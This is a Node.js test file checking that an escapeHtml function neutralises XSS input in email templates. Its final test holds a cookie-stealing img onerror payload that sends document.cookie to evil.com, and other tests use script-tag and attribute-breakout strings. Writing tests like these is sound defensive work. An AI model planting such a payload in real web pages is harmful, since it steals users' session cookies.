import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { escapeHtml } from "../src/lib/email/escape.ts";

describe("escapeHtml — email template XSS defence", () => {
  it("escapes HTML tags", () => {
    assert.equal(
      escapeHtml("<script>alert(1)</script>"),
      "&lt;script&gt;alert(1)&lt;/script&gt;",
    );
  });

  it("escapes attribute-breakout characters", () => {
    assert.equal(
      escapeHtml('" onclick="alert(1)'),
      "&quot; onclick=&quot;alert(1)",
    );
  });

  it("escapes single quotes", () => {
    assert.equal(escapeHtml("O'Reilly"), "O&#39;Reilly");
  });

  it("escapes ampersands first to avoid double-encoding", () => {
    assert.equal(escapeHtml("Tom & Jerry <img>"), "Tom &amp; Jerry &lt;img&gt;");
  });

  it("handles null and undefined safely", () => {
    assert.equal(escapeHtml(null), "");
    assert.equal(escapeHtml(undefined), "");
  });

  it("coerces non-string values", () => {
    assert.equal(escapeHtml(42), "42");
    assert.equal(escapeHtml(true), "true");
  });

  it("leaves plain text unchanged", () => {
    assert.equal(
      escapeHtml("Maria K. from Cyprus"),
      "Maria K. from Cyprus",
    );
  });

  it("neutralises an img onerror payload", () => {
    const payload = '<img src=x onerror="fetch(`//evil.com/?c=`+document.cookie)">';
    const escaped = escapeHtml(payload);
    // Raw `<img ...>` tag cannot be parsed as HTML after escaping
    assert.ok(!escaped.includes("<img"));
    // Attribute-breakout quote is encoded, so the whole string is inert text
    assert.ok(!escaped.includes('="'));
    assert.ok(escaped.includes("&quot;"));
  });
});
